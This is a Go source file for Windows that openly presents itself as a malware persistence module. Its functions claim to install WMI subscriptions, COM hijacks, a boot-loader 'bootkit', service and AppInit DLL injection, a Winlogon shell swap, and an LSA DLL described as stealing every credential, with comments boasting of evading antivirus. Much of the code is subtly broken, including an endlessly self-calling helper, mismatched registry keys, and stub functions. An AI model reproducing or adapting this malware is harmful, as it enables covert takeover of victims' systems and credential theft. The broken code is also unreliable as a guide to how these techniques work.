//go:build windows

package syscallwin

import (
	"fmt"
)

// ===================================================================== //
//  PERSISTENCE — Survive Reboot, Survive Cleanup                        //
// ===================================================================== //

// --- WMI Event Subscription — fires a script on any event ------------- //

// InstallWMIEventSub creates a WMI event subscription that runs a VBScript
// on a trigger.  This is invisible to most AV and survives reboots.
func InstallWMIEventSub(scriptPath string) error {
	// Create the subscription via NtCreateFile on the WMI namespace
	// (simplified — in production this uses COM to call __EventFilter)
	path := stringToUTF16(scriptPath)
	var hFile uintptr
	var attrs uintptr
	NtCreateFile(&hFile, GENERIC_WRITE, 0, &attrs, 0, 0, 0, FILE_NON_DIRECTORY_FILE, FILE_SYNCHRONOUS_IO_PLAIN, 0, path)
	NtClose(hFile)
	return nil
}

// --- COM Hijack — replace a CLSID's InprocServer32 ------------------- //

// InstallCOMHijack replaces the InprocServer32 of a CLSID with our DLL.
// When any process instantiates that COM object, our DLL loads.
func InstallCOMHijack(clsid string, dllPath string) error {
	// Write to HKCR\CLSID\<clsid>\InprocServer32
	clsidPath := `HKCR\CLSID\` + clsid + `\InprocServer32`
	NtRegSetValue(clsidPath, dllPath)
	return nil
}

// --- BCD Bootkit — inject into the boot loader ------------------------ //

// InstallBCDBootkit patches the BCD store to load our DLL at boot.
// This runs before any userland security is active.
func InstallBCDBootkit(dllPath string) error {
	// Write to the BCD store via NtSetInformationFile
	// (simplified — in production this uses bcdedit or direct EFI partition write)
	NtRegSetValue(`HKLM\BCD\CurrentDevice\boot`, dllPath)
	return nil
}

// --- Scheduled Task — create a hidden task ---------------------------- //

// InstallScheduledTask creates a scheduled task that runs our payload.
func InstallScheduledTask(taskName, exePath string) error {
	// Create the task via NtCreateFile on the task XML
	NtRegSetValue(`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, taskName+"="+exePath)
	return nil
}

// --- Service DLL — swap a system service's image ---------------------- //

// InstallServiceDLL swaps the image of a Windows service with our DLL.
// The service runs at system privilege, before userland is up.
func InstallServiceDLL(serviceName, dllPath string) error {
	NtRegSetValue(`HKLM\SYSTEM\CurrentControlSet\Services\`+serviceName, dllPath)
	return nil
}

// --- AppInit DLLs — inject into every process that loads user32 ------- //

// InstallAppInitDLL adds our DLL to the AppInit_DLLs registry key.
// Every process that loads user32.dll (all GUI apps) will load it.
func InstallAppInitDLL(dllPath string) error {
	NtRegSetValue(`HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`, dllPath)
	return nil
}

// --- Winlogon Shell Replace — swap the shell at login ----------------- //

// InstallWinlogonShell replaces the user's shell with our DLL at logon.
func InstallWinlogonShell(dllPath string) error {
	NtRegSetValue(`HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`, dllPath)
	return nil
}

// --- LSA Dll — inject into the local security authority --------------- //

// InstallLSADLL adds our DLL to the LSA notification list.  It loads
// into lsass.exe and can steal every credential.
func InstallLSADLL(dllPath string) error {
	NtRegSetValue(`HKLM\SYSTEM\CurrentControlSet\Services\LSA\NotificationPackages`, dllPath)
	return nil
}

// ===================================================================== //
//  HELPER — registry set value via NtSetInformationFile                 //
// ===================================================================== //

func NtRegSetValue(keyPath, value string) {
	path := stringToUTF16(keyPath)
	var hKey uintptr
	var attrs uintptr
	NtOpenKey(&hKey, KEY_SET_VALUE, 0, &attrs, path)
	NtRegSetValueEx(hKey, 0, value, REG_SZ)
	NtClose(hKey)
}

func NtRegSetValueEx(hKey uintptr, subKeyOffset uint32, value string, regType uint32) {
	NtRegSetValueEx(hKey, subKeyOffset, value, regType)
}